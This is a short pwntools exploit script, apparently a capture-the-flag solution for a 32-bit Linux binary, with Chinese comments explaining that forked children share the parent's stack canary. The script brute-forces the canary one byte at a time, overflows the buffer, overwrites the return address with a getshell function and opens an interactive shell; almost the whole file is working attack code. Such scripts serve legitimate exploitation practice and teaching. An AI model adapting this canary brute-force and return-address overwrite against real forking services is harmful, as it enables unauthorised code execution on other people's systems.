#!/usr/bin/python
"""
-- fork 函数创建的子进程的 Canary 也是相同的因为 fork 函数会直接拷贝父进程的内存
while (1) {
    printf("Haker!\n");
    if (fork()) //father
    {
        wait(NULL);
    } else //child
    {
        vuln();
        exit(0);
    }
}
"""
from pwn import *
import time

context(os='linux', arch='i386', log_level='debug')
sh = process('a')
offset = 100
delay = 0.01
# get canary
canary = '\x00'
for i in range(2, 5):  # 32位 4Bytes, 爆破3字节 , 用 range(3)也行
    for byte in range(256):
        sh.send('A' * offset + canary + chr(byte))
        time.sleep(delay)
        res = sh.recv()
        if b"*** stack smashing detected ***" not in res:
            canary += chr(byte)
            break
assert (len(canary) == i)

print('canary = ' + hex(u32(canary)))
# getshell
getshell = ELF('a').sym['getshell']
exp = ''
exp += 'A' * offset  # padding
exp += canary + 'A' * 8  # canary 本题 ida 里看下面有8个字符
exp += 'A' * 4  # caller's ebp
exp = flat(exp, getshell)  # ret addr
sh.send(exp)
sh.interactive()
